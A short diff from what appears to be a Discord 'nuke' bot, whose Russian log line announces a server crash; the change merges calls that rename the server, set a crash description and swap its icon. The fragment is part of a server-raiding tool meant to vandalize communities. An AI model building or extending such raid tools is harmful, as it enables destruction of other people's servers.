@@ -174,11 +174,12 @@ async def nuke(ctx):
     guild = ctx.guild
     log('~', "Выполняется краш сервера...")
 
-        
-    async with async_open(ICON_PATH, "rb") as icon:
-        await guild.edit(icon=await icon.read())
-
-    await guild.edit(name=CRASH_SERVER_NAME, description=CRASH_DESCRIPTION)
+    await guild.edit(
+        name=CRASH_SERVER_NAME, 
+        description=CRASH_DESCRIPTION,
+        icon = pfp.read()
+    )
+    
     start_time = discord.utils.utcnow() + datetime.timedelta(minutes=1)
     end_time = start_time + datetime.timedelta(days=365)
 
